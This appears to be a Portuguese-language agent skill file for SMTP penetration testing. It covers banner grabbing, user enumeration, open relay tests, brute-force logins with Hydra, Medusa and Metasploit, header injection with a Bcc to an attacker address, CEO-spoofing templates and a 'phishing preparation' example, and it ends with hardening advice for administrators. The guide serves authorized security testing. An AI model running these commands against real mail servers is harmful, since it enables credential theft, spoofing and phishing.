---
name: SMTP Penetration Testing
description: Esta habilidade deve ser usada quando o usuário pedir para "realizar testes de penetração SMTP", "enumerar usuários de email", "testar relés de mail abertos", "obter banners SMTP", "fazer força bruta em credenciais de email" ou "avaliar segurança do servidor de mail". Fornece técnicas abrangentes para testar segurança de servidores SMTP.
metadata:
  author: zebbern
  version: "1.1"
---

# SMTP Penetration Testing

## Purpose

Realizar avaliações de segurança abrangentes em servidores SMTP (Simple Mail Transfer Protocol) para identificar vulnerabilidades incluindo relés abertos, enumeração de usuários, autenticação fraca e configurações incorretas. Esta habilidade cobre banner grabbing, técnicas de enumeração de usuários, testes de relé, ataques de força bruta e recomendações de endurecimento de segurança.

## Prerequisites

### Ferramentas Necessárias
```bash
# Nmap com scripts SMTP
sudo apt-get install nmap

# Netcat
sudo apt-get install netcat

# Hydra para força bruta
sudo apt-get install hydra

# Ferramenta de enumeração de usuários SMTP
sudo apt-get install smtp-user-enum

# Metasploit Framework
msfconsole
```

### Conhecimentos Necessários
- Fundamentos do protocolo SMTP
- Arquitetura de email (MTA, MDA, MUA)
- DNS e registros MX
- Protocolos de rede

### Acesso Necessário
- IP/hostname do servidor SMTP alvo
- Autorização por escrito para testes
- Listas de palavras para enumeração e força bruta

## Outputs and Deliverables

1. **Relatório de Avaliação de Segurança SMTP** - Descobertas abrangentes de vulnerabilidades
2. **Resultados de Enumeração de Usuários** - Endereços de email válidos descobertos
3. **Resultados de Teste de Relé** - Status de relé aberto e potencial de exploração
4. **Recomendações de Remediação** - Orientação de endurecimento de segurança

## Core Workflow

### Phase 1: Entendimento da Arquitetura SMTP

```
Componentes: MTA (transferência) → MDA (entrega) → MUA (cliente)

Portas: 25 (SMTP), 465 (SMTPS), 587 (submission), 2525 (alternativa)

Fluxo: Sender MUA → Sender MTA → DNS/MX → Recipient MTA → MDA → Recipient MUA
```

### Phase 2: Descoberta de Serviço SMTP

Identifique servidores SMTP e versões:

```bash
# Descobrir portas SMTP
nmap -p 25,465,587,2525 -sV TARGET_IP

# Detecção agressiva de serviço
nmap -sV -sC -p 25 TARGET_IP

# Scripts específicos SMTP
nmap --script=smtp-* -p 25 TARGET_IP

# Descobrir registros MX para domínio
dig MX target.com
nslookup -type=mx target.com
host -t mx target.com
```

### Phase 3: Banner Grabbing

Recupere informações do servidor SMTP:

```bash
# Usando Telnet
telnet TARGET_IP 25
# Response: 220 mail.target.com ESMTP Postfix

# Usando Netcat
nc TARGET_IP 25
# Response: 220 mail.target.com ESMTP

# Usando Nmap
nmap -sV -p 25 TARGET_IP
# Version detection extrai informações de banner

# Comandos SMTP manuais
EHLO test
# Response mostra extensões suportadas
```

Analise informações de banner:

```
Banner revela:
- Software do servidor (Postfix, Sendmail, Exchange)
- Informações de versão
- Hostname
- Extensões SMTP suportadas (STARTTLS, AUTH, etc.)
```

### Phase 4: Enumeração de Comando SMTP

Teste comandos SMTP disponíveis:

```bash
# Conectar e testar comandos
nc TARGET_IP 25

# Saudação inicial
EHLO attacker.com

# Response mostra capacidades:
250-mail.target.com
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-AUTH PLAIN LOGIN
250-8BITMIME
250 DSN
```

Comandos principais para testar:

```bash
# VRFY - Verificar se usuário existe
VRFY admin
250 2.1.5 admin@target.com

# EXPN - Expandir lista de distribuição
EXPN staff
250 2.1.5 user1@target.com
250 2.1.5 user2@target.com

# RCPT TO - Verificação de destinatário
MAIL FROM:<test@attacker.com>
RCPT TO:<admin@target.com>
# 250 OK = usuário existe
# 550 = usuário não existe
```

### Phase 5: User Enumeration

Enumere endereços de email válidos:

```bash
# Usando smtp-user-enum com VRFY
smtp-user-enum -M VRFY -U /usr/share/wordlists/users.txt -t TARGET_IP

# Usando método EXPN
smtp-user-enum -M EXPN -U /usr/share/wordlists/users.txt -t TARGET_IP

# Usando método RCPT
smtp-user-enum -M RCPT -U /usr/share/wordlists/users.txt -t TARGET_IP

# Especificar porta e domínio
smtp-user-enum -M VRFY -U users.txt -t TARGET_IP -p 25 -d target.com
```

Usando Metasploit:

```bash
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS TARGET_IP
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
set UNIXONLY true
run
```

Usando Nmap:

```bash
# Script de enumeração de usuários SMTP
nmap --script smtp-enum-users -p 25 TARGET_IP

# Com lista de usuários customizada
nmap --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} -p 25 TARGET_IP
```

### Phase 6: Open Relay Testing

Teste para relay de email não autorizado:

```bash
# Usando Nmap
nmap -p 25 --script smtp-open-relay TARGET_IP

# Teste manual via Telnet
telnet TARGET_IP 25
HELO attacker.com
MAIL FROM:<test@attacker.com>
RCPT TO:<victim@external-domain.com>
DATA
Subject: Relay Test
This is a test.
.
QUIT

# Se aceito (250 OK), servidor é relé aberto
```

Usando Metasploit:

```bash
use auxiliary/scanner/smtp/smtp_relay
set RHOSTS TARGET_IP
run
```

Teste variações:

```bash
# Teste diferentes combinações sender/recipient
MAIL FROM:<>
MAIL FROM:<test@[attacker_IP]>
MAIL FROM:<test@target.com>

RCPT TO:<test@external.com>
RCPT TO:<"test@external.com">
RCPT TO:<test%external.com@target.com>
```

### Phase 7: Brute Force Authentication

Teste credenciais SMTP fracas:

```bash
# Usando Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt smtp://TARGET_IP

# Com porta específica e SSL
hydra -l admin -P passwords.txt -s 465 -S TARGET_IP smtp

# Múltiplos usuários
hydra -L users.txt -P passwords.txt TARGET_IP smtp

# Saída verbose
hydra -l admin -P passwords.txt smtp://TARGET_IP -V
```

Usando Medusa:

```bash
medusa -h TARGET_IP -u admin -P /path/to/passwords.txt -M smtp
```

Usando Metasploit:

```bash
use auxiliary/scanner/smtp/smtp_login
set RHOSTS TARGET_IP
set USER_FILE /path/to/users.txt
set PASS_FILE /path/to/passwords.txt
set VERBOSE true
run
```

### Phase 8: SMTP Command Injection

Teste vulnerabilidades de command injection:

```bash
# Teste de injeção de header
MAIL FROM:<attacker@test.com>
RCPT TO:<victim@target.com>
DATA
Subject: Test
Bcc: hidden@attacker.com
X-Injected: malicious-header

Injected content
.
```

Teste de spoofing de email:

```bash
# Sender falsificado (testa proteção SPF/DKIM)
MAIL FROM:<ceo@target.com>
RCPT TO:<employee@target.com>
DATA
From: CEO <ceo@target.com>
Subject: Urgent Request
Please process this request immediately.
.
```

### Phase 9: TLS/SSL Security Testing

Teste configuração de criptografia:

```bash
# Verificar suporte STARTTLS
openssl s_client -connect TARGET_IP:25 -starttls smtp

# SSL direto (porta 465)
openssl s_client -connect TARGET_IP:465

# Enumeração de cipher
nmap --script ssl-enum-ciphers -p 25 TARGET_IP
```

### Phase 10: SPF, DKIM, DMARC Analysis

Verifique registros de autenticação de email:

```bash
# Lookups de registros SPF/DKIM/DMARC
dig TXT target.com | grep spf            # SPF
dig TXT selector._domainkey.target.com    # DKIM
dig TXT _dmarc.target.com                 # DMARC

# Política SPF: -all = falha rigorosa, ~all = falha suave, ?all = neutra
```

## Quick Reference

### Comandos SMTP Essenciais

| Comando | Propósito | Exemplo |
|---------|-----------|---------|
| HELO | Identificar cliente | `HELO client.com` |
| EHLO | HELO estendido | `EHLO client.com` |
| MAIL FROM | Definir remetente | `MAIL FROM:<sender@test.com>` |
| RCPT TO | Definir destinatário | `RCPT TO:<user@target.com>` |
| DATA | Iniciar corpo da mensagem | `DATA` |
| VRFY | Verificar usuário | `VRFY admin` |
| EXPN | Expandir alias | `EXPN staff` |
| QUIT | Finalizar sessão | `QUIT` |

### Códigos de Resposta SMTP

| Código | Significado |
|--------|------------|
| 220 | Serviço pronto |
| 221 | Fechando conexão |
| 250 | OK / Ação solicitada concluída |
| 354 | Iniciar entrada de mail |
| 421 | Serviço não disponível |
| 450 | Caixa de correio indisponível |
| 550 | Usuário desconhecido / Caixa de correio não encontrada |
| 553 | Nome de caixa de correio não permitido |

### Comandos de Ferramenta de Enumeração

| Ferramenta | Comando |
|------------|---------|
| smtp-user-enum | `smtp-user-enum -M VRFY -U users.txt -t IP` |
| Nmap | `nmap --script smtp-enum-users -p 25 IP` |
| Metasploit | `use auxiliary/scanner/smtp/smtp_enum` |
| Netcat | `nc IP 25` depois comandos manuais |

### Vulnerabilidades Comuns

| Vulnerabilidade | Risco | Método de Teste |
|-----------------|-------|-----------------|
| Relé Aberto | Alto | Teste de relé com destinatário externo |
| Enumeração de Usuários | Médio | Comandos VRFY/EXPN/RCPT |
| Divulgação de Banner | Baixo | Banner grabbing |
| Autenticação Fraca | Alto | Ataque de força bruta |
| Sem TLS | Médio | Teste STARTTLS |
| SPF/DKIM Faltando | Médio | Lookup de registro DNS |

## Constraints and Limitations

### Requisitos Legais
- Teste apenas servidores SMTP que você possui ou tem autorização para testar
- Enviar spam ou emails maliciosos é ilegal
- Documente todas as atividades de teste
- Não abuse de relés abertos descobertos

### Limitações Técnicas
- VRFY/EXPN geralmente desabilitados em servidores modernos
- Rate limiting pode retardar enumeração
- Alguns servidores respondem identicamente para usuários válidos/inválidos
- Greylisting pode atrasar respostas de enumeração

### Limites Éticos
- Nunca envie spam real através de relés descobertos
- Não colha endereços de email para uso malicioso
- Reporte relés abertos aos administradores do servidor
- Use descobertas apenas para melhoria de segurança autorizada

## Examples

### Example 1: Avaliação Completa de SMTP

**Cenário:** Avaliação de segurança completa do servidor de mail

```bash
# Etapa 1: Descoberta de serviço
nmap -sV -sC -p 25,465,587 mail.target.com

# Etapa 2: Banner grab
nc mail.target.com 25
EHLO test.com
QUIT

# Etapa 3: Enumeração de usuários
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t mail.target.com

# Etapa 4: Teste de relé aberto
nmap -p 25 --script smtp-open-relay mail.target.com

# Etapa 5: Teste de autenticação
hydra -l admin -P /usr/share/wordlists/fasttrack.txt smtp://mail.target.com

# Etapa 6: Verificação TLS
openssl s_client -connect mail.target.com:25 -starttls smtp

# Etapa 7: Verificar autenticação de email
dig TXT target.com | grep spf
dig TXT _dmarc.target.com
```

### Example 2: Ataque de Enumeração de Usuários

**Cenário:** Enumerar usuários válidos para preparação de phishing

```bash
# Método 1: VRFY
smtp-user-enum -M VRFY -U users.txt -t 192.168.1.100 -p 25

# Método 2: RCPT com análise de timing
smtp-user-enum -M RCPT -U users.txt -t 192.168.1.100 -p 25 -d target.com

# Método 3: Metasploit
msfconsole
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS 192.168.1.100
set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
run

# Resultados mostram usuários válidos
[+] 192.168.1.100:25 - Found user: admin
[+] 192.168.1.100:25 - Found user: root
[+] 192.168.1.100:25 - Found user: postmaster
```

### Example 3: Exploração de Relé Aberto

**Cenário:** Teste e documente vulnerabilidade de relé aberto

```bash
# Teste via Telnet
telnet mail.target.com 25
HELO attacker.com
MAIL FROM:<test@attacker.com>
RCPT TO:<test@gmail.com>
# Se 250 OK - VULNERÁVEL

# Documente com Nmap
nmap -p 25 --script smtp-open-relay --script-args smtp-open-relay.from=test@attacker.com,smtp-open-relay.to=test@external.com mail.target.com

# Output:
# PORT   STATE SERVICE
# 25/tcp open  smtp
# |_smtp-open-relay: Server is an open relay (14/16 tests)
```

## Troubleshooting

| Problema | Causa | Solução |
|----------|-------|---------|
| Conexão Recusada | Porta bloqueada ou fechada | Verifique porta com nmap; ISP pode bloquear porta 25; tente 587/465; use VPN |
| VRFY/EXPN Desabilitado | Servidor endurecido | Use método RCPT TO; analise variações de resposta/código |
| Força Bruta Bloqueada | Rate limiting/lockout | Reduza velocidade (`hydra -W 5`); use password spraying; verifique fail2ban |
| Erros SSL/TLS | Porta ou protocolo incorreto | Use 465 para SSL, 25/587 para STARTTLS; verifique resposta EHLO |

## Recomendações de Segurança

### Para Administradores

1. **Desabilite Relé Aberto** - Exija autenticação para entrega externa
2. **Desabilite VRFY/EXPN** - Impeça enumeração de usuários
3. **Enforcer TLS** - Exija STARTTLS para todas as conexões
4. **Implemente SPF/DKIM/DMARC** - Impeça falsificação de email
5. **Rate Limiting** - Previna ataques de força bruta
6. **Bloqueio de Conta** - Bloqueie contas após tentativas falhadas
7. **Banner Hardening** - Minimize divulgação de informações do servidor
8. **Log Monitoring** - Alerte sobre atividades suspeitas
9. **Patch Management** - Mantenha software SMTP atualizado
10. **Controles de Acesso** - Restrinja SMTP a IPs autorizados